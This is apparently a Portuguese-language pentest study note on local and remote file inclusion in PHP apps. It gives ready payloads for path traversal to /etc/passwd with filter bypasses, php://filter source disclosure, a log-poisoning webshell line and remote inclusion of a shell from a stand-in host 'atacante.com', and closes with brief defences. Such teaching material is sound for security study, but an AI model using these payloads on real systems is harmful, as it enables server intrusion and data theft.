# 🗂️ LFI / RFI — Local & Remote File Inclusion

> Ocorre quando a aplicação inclui arquivos com base em input do usuário sem validação, permitindo ler arquivos sensíveis do servidor (LFI) ou incluir código remoto (RFI).

---

## 🧠 O Que é File Inclusion

Aplicações que usam parâmetros para decidir qual arquivo carregar são vulneráveis se não validarem o caminho:

http://alvo/index.php?page=sobre.php


Se `page` não for validado, dá pra manipular o caminho pra incluir qualquer arquivo do sistema.

---

## 🔢 LFI vs RFI

| Tipo | O que faz | Requisito |
|---|---|---|
| **LFI** | Lê/inclui arquivos locais do servidor | Nenhum requisito especial |
| **RFI** | Inclui arquivo hospedado remotamente | `allow_url_include=On` no PHP (raro em produção) |

---

## 🔍 LFI — Lendo Arquivos Locais

?page=../../../../etc/passwd
?page=../../../../../../etc/passwd
?page=....//....//....//etc/passwd ← bypass de filtro simples de "../"
?page=..%2f..%2f..%2fetc%2fpasswd ← bypass via URL encoding


**Usando wrapper PHP pra ler código-fonte (não só executar):**

?page=php://filter/convert.base64-encode/resource=config.php

*(depois é só decodificar o Base64 retornado pra ler o conteúdo do arquivo)*

---

## 🔥 LFI → RCE via Log Poisoning
Enviar User-Agent malicioso contendo código PHP:
User-Agent: <?php system($_GET['cmd']); ?>
Fazer uma requisição normal ao servidor (o User-Agent vai pro log de acesso)
Incluir o log via LFI:
?page=../../../../var/log/apache2/access.log&cmd=whoami
O código PHP injetado no log é executado pelo servidor

---

## 🌐 RFI — Incluindo Arquivo Remoto

?page=http://atacante.com/shell.txt
?page=http://atacante.com/shell.txt%00 ← null byte bypass (PHP antigo)


*(shell.txt hospedado no atacante contém código PHP de webshell)*

---

## ⚠️ Detecção e Defesa
Whitelist de arquivos permitidos em vez de validação por blacklist
Desabilitar allow_url_include e allow_url_fopen no PHP
Rodar aplicação com usuário de baixo privilégio (limita o que LFI consegue ler)
Logs de acesso monitorados para padrões de path traversal (../)

---

## 📌 Relacionados

- [[ASP Webshell — Conceito e Uso em Pentest]]
- [[Command Injection]]
- [[Exploit Apache Tomcat 8.5.19 (JSP Upload Bypass RCE)]]

#web #lfi #rfi #exploração